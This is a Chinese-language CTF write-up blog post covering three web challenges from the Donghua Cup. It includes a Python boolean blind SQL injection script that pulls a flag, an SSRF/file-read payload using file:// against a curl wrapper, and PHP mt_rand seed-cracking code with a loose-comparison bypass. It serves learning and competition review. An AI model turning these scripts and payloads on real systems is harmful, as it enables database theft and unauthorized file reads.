---
layout: post
title: 东华杯web
category: blog
description: 作身为一个新人，只能在赛后复现一下，总结一下思路。
---

##web1

 这一题过滤了“ and = union ' ”,把“=”换成“like”,"and"用“or"取代
 
    http://266dfa9c90ab43efad401761249dd9c842b417a05e0847d2.game.ichunqiu.com/index.php?id=0 or 1 like 1# 有回显

    http://266dfa9c90ab43efad401761249dd9c842b417a05e0847d2.game.ichunqiu.com/index.php?id=0 or 1 like 2# 无回显
 
说明是盲注，方法可以参照[基于布尔的盲注学习笔记](http://blog.csdn.net/squeen_/article/details/52767887)

附上最后的爆破脚本：

    import requests  
    def getDBName(DBName_len):  
        DBName = ""  
         
        success_url = "http://266dfa9c90ab43efad401761249dd9c842b417a05e0847d2.game.ichunqiu.com/index.php?id=1"  
        success_response_len = len(requests.get(success_url).text)  
         
        url_template = "http://266dfa9c90ab43efad401761249dd9c842b417a05e0847d2.game.ichunqiu.com/index.php?id=0 or ascii(substr((select f14g from f14g limit 0,1), {0}, 1)) like {1}%23"  
        chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_-'  
         
        print("Start to retrieve database name...")  
        print("Success_response_len is: ", success_response_len)  
        for i in range( 1, DBName_len + 1):  
            print("Number of letter: " , i)  
            tempDBName = DBName  
            for char in chars:  
                print("Test letter " + char)  
                char_ascii = ord(char)  
                url = url_template.format(i, char_ascii)  
                response = requests.get(url)  
                if len(response.text) == success_response_len:  
                    DBName += char  
                    print("DBName is: " + DBName + "...")  
                    break  
            if tempDBName == DBName:  
                print("Letters too little! Program ended." )  
                exit()  
        print("Retrieve completed! DBName is: " + DBName)  
         
    getDBName(42)  
结果如图：
![web1](/images/other/donghua_web1.png)

##web2

这题比较水，直接action=flag是可以直接得出的。

后来看了别的队伍的思路，可以扫出.git
![web2](/images/other/donghua_web2_1.png)

下载下来分析出是zlib文件
![web2](/images/other/donghua_web2_2.png)

然后用winhex打开转换一下就得到源码了
![web2](/images/other/donghua_web2_3.png)

最后得到源码：

index.php

    <?php
    include "function.php";
    if(isset($_GET["action"])){
        $page = addslashes($_GET["action"]);
    }else{
        $page = "home";
    }
    if(file_exists($page.'.php')){

        $file = @file_get_contents($page.".php");
        echo $file;
    }
    if(@$_GET["action"]=="album"){
        if(isset($_GET["pid"])){
            curl($_GET["pid"]);
        }
    }
    ?>
    
function.php

    <?php
    function curl($url){
        $ob = curl_init();
        curl_setopt($ob, CURLOPT_URL, $url);
        curl_setopt($ob, CURLOPT_HEADER, 0);
        $re = curl_exec($ob);
        curl_close($ob);
        return $re;
    }
    function getPic($num){
        if(file_exists("./IMG/$num.jpg")){
            $path = "./IMG/$num.jpg";
            return $path;           
        }
    }
    ?>

构造payload

    http://6406486eb7a444a3916e631f4c604d658117d965a360429f.game.ichunqiu.com/index.php?action=album&pid=file:///var/www/html/flag.php
直接读取得：
![web2](/images/other/donghua_web2_4.png)

##web3

扫出code.zip，打开后发现代码是加密过的；
Wfox的[解密脚本](http://sec2hack.com/phpjiami.zip);
解密后的代码如下：

admin.php

    <?php
    if($_GET['authAdmin']!="***********"){
        die("No login!");
    }
    if(!isset($_POST['auth'])){
        die("No Auth");
    }else{
        $auth  = $_POST['auth'];
        $auth_code = "**********";
        if(json_decode($auth) == $auth_code){
            ;
        }else{
            header("Location:index.php");
        }
    }
    ?>
    
file.php

    <?php
    if($_POST["auth"]=="***********"){
        if(isset($_GET["id"]) &&  (strpos($_GET["id"],'jpg') !== false))
        {
            $id = $_GET["id"];
            
            preg_match("/^php:\/\/.*resource=([^|]*)/i", trim($id), $matches);

            if (isset($matches[1]))
                $id = $matches[1];

            if (file_exists("./" . $id) == false)
                die("file not found");
            $img_data = fopen($id,'rb');
            $data  = fread($img_data,filesize($id));
            echo $data;
        
        }else{
            echo "file not found";
        }
    }
    ?>

index.php

    <?php
    $seed = rand(0,99999);
    mt_srand($seed);
    session_start();
    function auth_code($length = 12, $special = true)
    {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        if ($special) {
            $chars .= '!@#$%^&*()';
        }
        $password = '';
        for ($i = 0; $i < $length; $i++) {
            $password .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
        }
        return $password;
    }

    $key = auth_code(16, false);
    echo "The key is :" . $key . "<br>";
    $private = auth_code(10, false);


    if(isset($_POST['private'])){
        if($_POST['private'] === $_SESSION["pri"]){
            header("Location:admin.php");
        }else{
            $_SESSION["pri"] = $private;
            die("No private!");
        }
    }
    ?>
参照[wonderkun's|blog](http://wonderkun.cc/index.html/?p=585#comments)

破解seed:

    <?php
    $str = "ARBipkIOANQKJwby";
    $randStr = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     
    for($i=0;$i<strlen($str);$i++){
       $pos = strpos($randStr,$str[$i]);
       echo $pos." ".$pos." "."0 ".(strlen($randStr)-1)." ";
       //整理成方便 php_mt_seed 测试的格式
      //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]
    }
    echo "\n";
    ?>
运行如下：
![web3](/images/other/donghua_web3_1.png)

推解出private:

    <?php
    $seed = 71110;
    mt_srand($seed);
    session_start();
    function auth_code($length = 12, $special = true)
    {
        $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        if ($special) {
            $chars .= '!@#$%^&*()';
        }
        $password = '';
        for ($i = 0; $i < $length; $i++) {
            $password .= substr($chars, mt_rand(0, strlen($chars)-1), 1);
        }
        return $password;
    }

    $key = auth_code(16, false);
    echo "The key is :".$key."<br>";
    $private = auth_code(10, false);
    echo "aaa".$private."bbb";
    if (isset($_POST['private'])) {
        if ($_POST['private'] === $_SESSION["pri"]) {
            echo "1";
        }
        else {
            $_SESSION["pri"] = $private;
            die("No private!");
        }
    }

    ?>

![web3](/images/other/donghua_web3_2.png)

到这一步思考了很长时间不知道怎么推算下个seed,
最后结合[Cracking PHP rand()](http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/)
和[web500-2](https://github.com/wonderkun/CTF_web/blob/master/web500-2/writeup.pdf)
发现根据前31个seed，算出第32个seed，脚本在[Cracking PHP rand()](http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/)里。

private POST正确后会进入admin.php：
![web3](/images/other/donghua_web3_3.png)

"=="可以弱类型绕过
![web3](/images/other/donghua_web3_4.png)

![web3](/images/other/donghua_web3_5.png)

fiddler抓包发现：
![web3](/images/other/donghua_web3_6.png)

构造payload:
![web3](/images/other/donghua_web3_7.png)

得出：
![web3](/images/other/donghua_web3_8.png)

##总结

<ul>
    <li>web1发现自己的SQL并不真正理解，以至于在开始没有发现只是一道盲注题，而手无足措。
    <li>web2是由于自己没能第一时间打开题目，以至于出现bug情况下没抢到加分。并且，文件包含需要深度学习一下。
    <li>web3开始的seed猜解并没有做出，但是赛后一步一步分析下来还是能够理解，经验不够，深度不够，以此反思。
</ul>